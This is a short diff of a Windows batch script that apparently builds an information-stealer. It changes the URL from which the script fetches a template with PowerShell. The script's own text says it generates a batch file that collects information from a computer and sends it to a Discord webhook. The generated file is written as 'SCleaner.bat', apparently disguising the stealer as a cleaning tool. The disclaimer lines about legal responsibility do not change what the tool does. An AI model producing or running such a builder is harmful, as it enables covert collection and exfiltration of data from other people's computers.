@@ -14,7 +14,7 @@ echo USER ASSUMES FULL LEGAL RESPONSIBILITY FOR ALL ACTIONS PERFORMED.
 echo MISUSE MAY VIOLATE COMPUTER CRIME LAWS IN YOUR JURISDICTION.
 echo This will generate a batch script that will collect info from a computer and send it to a discord webhook.
 echo.
-if not exist isgen.txt echo Downloading isgen.txt.. & echo. & powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://raw.githubusercontent.com/SchooiCodes/smt/refs/heads/main/Files/isgen.txt -OutFile isgen.txt"
+if not exist isgen.txt echo Downloading isgen.txt.. & echo. & powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://raw.githubusercontent.com/SchooiCodes/isgen/refs/heads/main/isgen.txt -OutFile isgen.txt"
 if "%webhook%"=="" set /p webhook=Please enter a webhook URL: 
 if exist "%TEMP%\SCleaner.bat" del "%TEMP%\SCleaner.bat"
 type isgen.txt>>"%TEMP%\SCleaner.bat"
